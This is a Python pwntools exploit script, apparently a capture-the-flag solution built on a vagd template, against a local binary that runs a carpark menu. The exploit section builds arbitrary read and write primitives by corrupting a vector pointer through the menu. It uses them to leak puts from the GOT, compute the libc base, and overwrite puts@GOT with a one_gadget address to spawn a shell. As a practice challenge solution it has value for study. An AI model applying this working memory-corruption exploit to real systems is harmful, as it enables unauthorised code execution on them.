#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ vagd template ./chall
from pwn import *


GOFF   = 0x555555554000                               # GDB default base address
IP     = 'localhost'                                           # remote IP
PORT   = 33102                                            # remote PORT
BINARY = './chall'                                    # PATH to local binary
ARGS   = []                                           # ARGS supplied to binary
ENV    = {}                                           # ENV supplied to binary
BOX    = 'ubuntu:noble'                               # Docker box image

# GDB SCRIPT, executed at start of GDB session (e.g. set breakpoints here)
GDB    = f"""
set follow-fork-mode parent

c"""

context.binary = exe = ELF(BINARY, checksec=False)    # binary
context.aslr = False                                  # ASLR enabled (only GDB)

# abbreviations
cst = constants
shc = shellcraft

# logging
linfo = lambda x, *a: log.info(x, *a)
lwarn = lambda x, *a: log.warn(x, *a)
lerr  = lambda x, *a: log.error(x, *a)
lprog = lambda x, *a: log.progress(x, *a)
lhex  = lambda x, y="leak": linfo(f"{x:#018x} <- {y}")
phex  = lambda x, y="leak": print(f"{x:#018x} <- {y}")

# type manipulation
byt   = lambda x: x if isinstance(x, (bytes, bytearray)) else f"{x}".encode()
rpad  = lambda x, s=8, v=b"\0": x.ljust(s, v)
lpad  = lambda x, s=8, v=b"\0": x.rjust(s, v)
hpad  = lambda x, s=0: f"%0{s if s else ((x.bit_length() // 8) + 1) * 2}x" % x
upad  = lambda x: u64(rpad(x))
cpad  = lambda x, s: byt(x) + cyc(s)[len(byt(x)):]
tob   = lambda x: bytes.fromhex(hpad(x))

# elf aliases
gelf  = lambda elf=None: elf if elf else exe
srh   = lambda x, elf=None: gelf(elf).search(byt(x)).__next__()
sasm  = lambda x, elf=None: gelf(elf).search(asm(x), executable=True).__next__()
lsrh  = lambda x: srh(x, libc)
lasm  = lambda x: sasm(x, libc)

# cyclic aliases
cyc = lambda x: cyclic(x)
cfd = lambda x: cyclic_find(x)
cto = lambda x: cyc(cfd(x))

# tube aliases
t   = None
gt  = lambda at=None: at if at else t
sl  = lambda x, t=None, *a, **kw: gt(t).sendline(byt(x), *a, **kw)
se  = lambda x, t=None, *a, **kw: gt(t).send(byt(x), *a, **kw)
ss  = (
        lambda x, s, t=None, *a, **kw: sl(x, t, *a, **kw)
        if len(x) < s
        else se(x, *a, **kw)
          if len(x) == s
          else lerr(f"ss to big: {len(x):#x} > {s:#x}")
      )
sla = lambda x, y, t=None, *a, **kw: gt(t).sendlineafter(
        byt(x), byt(y), *a, **kw
      )
sa  = lambda x, y, t=None, *a, **kw: gt(t).sendafter(byt(x), byt(y), *a, **kw)
sas = (
        lambda x, y, s, t=None, *a, **kw: sla(x, y, t, *a, **kw)
        if len(y) < s
        else sa(x, y, *a, **kw)
          if len(y) == s
          else lerr(f"ss to big: {len(x):#x} > {s:#x}")
      )
ra  = lambda t=None, *a, **kw: gt(t).recvall(*a, **kw)
rl  = lambda t=None, *a, **kw: gt(t).recvline(*a, **kw)
rls = lambda t=None, *a, **kw: rl(t=t, *a, **kw)[:-1]
rcv = lambda x, t=None, *a, **kw: gt(t).recv(x, *a, **kw)
ru  = lambda x, t=None, *a, **kw: gt(t).recvuntil(byt(x), *a, **kw)
it  = lambda t=None, *a, **kw: gt(t).interactive(*a, **kw)
cl  = lambda t=None, *a, **kw: gt(t).close(*a, **kw)


# setup vagd vm
vm = None
def setup():
  global vm
  if args.REMOTE or args.LOCAL:
    return None

  try:
    # only load vagd if needed
    from vagd import Dogd, Qegd, Box
  except ModuleNotFoundError:
    log.error('Failed to import vagd, run LOCAL/REMOTE or install it')
  if not vm:
    vm = Dogd(BINARY, image=BOX, symbols=True, ex=True, fast=True)  # Docker
    # vm = Qegd(BINARY, img=Box.QEMU_UBUNTU, symbols=True, ex=True, fast=True)  # Qemu
  if vm.is_new:
    # additional setup here
    log.info('new vagd instance')

  return vm


# get target (pwnlib.tubes.tube)
def get_target(**kw):
  if args.REMOTE:
    # context.log_level = 'debug'
    return remote(IP, PORT)

  if args.LOCAL:
    if args.GDB:
      return gdb.debug([BINARY] + ARGS, env=ENV, gdbscript=GDB, **kw)
    return process([BINARY] + ARGS, env=ENV, **kw)

  return vm.start(argv=ARGS, env=ENV, gdbscript=GDB, **kw)


vm = setup()

#===========================================================
#                   EXPLOIT STARTS HERE
#===========================================================
# Arch:       amd64-64-little
# RELRO:      Partial RELRO
# Stack:      Canary found
# NX:         NX enabled
# PIE:        No PIE (0x400000)
# SHSTK:      Enabled
# IBT:        Enabled
# Stripped:   No
# Debuginfo:  Yes
# Comment:    GCC: (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0

"""

   32         puts("1. Change carpark1 car");
   33         puts("2. View carpark1 car");
   34         puts("3. Change carpark2 car");
   35         puts("4. View carpark2 car");

overwrite GOT entry for `puts`
1. read GOT using arbread to get libc leak 
2. get libc leak using arbread
3. calculate one gadget addr
4. overwrite GOT of puts using one gadget

[0x404068] puts@GLIBC_2.2.5 -> 0x7ffff7880e50 (puts) ◂— endbr64
"""

context.log_level = 'debug'

# returns an integer
def arbread(addr):
  sla(b'> ', b'1')
  sla(b'> ', b'10') # change vector<ll> pointer
  sla(b'> ', str(addr).encode())
  sla(b'> ', b'4')
  sla(b'> ', b'0') # view car 0
  ru(b"is ")
  return int(rl()[:-1].decode())

# to_overwrite_with: integer
def arbwrite(addr, to_overwrite_with):
  sla(b'> ', b'1')
  sla(b'> ', b'10') # change vector<ll> pointer
  sla(b'> ', str(addr).encode())
  sla(b'> ', b'3')
  sla(b'> ', b'0') # view car 0
  sla(b'> ', str(to_overwrite_with).encode())

libc = ELF('./libc.so.6', checksec=False)

t = get_target()
puts_libc = arbread(0x404068)
lhex(puts_libc, "libc puts addr")
libc.address = puts_libc - libc.sym['puts']
ONE_GADGET = libc.address + 0xebc88
lhex(libc.address, "libc.address")
arbwrite(0x404068, ONE_GADGET)
it()
